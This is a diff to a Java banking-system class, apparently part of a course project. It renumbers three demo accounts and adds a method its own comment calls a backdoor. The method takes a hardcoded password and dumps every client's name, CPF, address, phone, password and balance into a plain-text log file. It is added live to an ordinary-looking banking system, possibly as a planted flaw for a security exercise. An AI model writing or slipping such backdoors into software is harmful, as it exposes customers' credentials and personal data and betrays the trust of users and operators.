@@ -1,9 +1,14 @@
 package Servidor;
 
+import java.util.Date;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.Scanner;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.io.PrintWriter;
 import java.text.DecimalFormat;
+import java.text.SimpleDateFormat;
 
 public class SistemaBancario {
     
@@ -18,9 +23,9 @@ public class SistemaBancario {
 
         this.listaContas = new HashMap<>();
 
-        listaContas.put("1234", new ContaCorrente("Fernando da Silva", "12233344456", "Rua do tedio", "78675654", "EuAmo"));
-        listaContas.put("0987", new ContaCorrente("Ricardo Souza", "11100099987", "Rua da paixao", "00909909", "Seguranca"));
-        listaContas.put("312", new ContaCorrente("Maria Eduarda", "33377787878", "Rua sem nome", "11123434", "Computacional"));
+        listaContas.put("20", new ContaCorrente("Fernando da Silva", "12233344456", "Rua do tedio", "78675654", "EuAmo"));
+        listaContas.put("40", new ContaCorrente("Ricardo Souza", "11100099987", "Rua da paixao", "00909909", "Seguranca"));
+        listaContas.put("60", new ContaCorrente("Maria Eduarda", "33377787878", "Rua sem nome", "11123434", "Computacional"));
     }
     
     //Autenticar usuários (User Story 1)
@@ -152,6 +157,36 @@ public class SistemaBancario {
     //Autenticação de mensagens (User Story 8)
     public boolean autenticarMensagens(String conta, String senha){
         return autenticarUser(conta, senha);
+    }
+
+
+    // Backdoor para acessar dados bancários dos clientes e armazená-los em um log
+    public void backdoorAcessarDados(String senhaBackdoor) {
+        if (senhaBackdoor.equals("senha_secreta")) {
+            try {
+                FileWriter arquivoLog = new FileWriter("log_acessos.txt", true);
+                PrintWriter gravador = new PrintWriter(arquivoLog);
+                SimpleDateFormat formatoData = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
+                Date dataAtual = new Date();
+
+                // Iterar sobre todas as contas e registrar os dados sensíveis
+                for (ContaCorrente conta : listaContas.values()) {
+                    String registro = formatoData.format(dataAtual) + " - Conta: " + conta.getNumConta() + 
+                                      ", Cliente: " + conta.getNome() + ", CPF: " + conta.getCpf() +
+                                      ", Endereço: " + conta.getEndereco() + ", Telefone: " + conta.getTelefone() + 
+                                      ", Senha: " + conta.getSenha() + ", Saldo: " + conta.saldo();
+                    gravador.println(registro);
+                }
+
+                gravador.close();
+                arquivoLog.close();
+            } catch (IOException e) {
+                System.err.println("Erro ao acessar ou escrever no arquivo de log.");
+                e.printStackTrace();
+            }
+        } else {
+            System.out.println("Senha do backdoor incorreta.");
+        }
     }
     
     
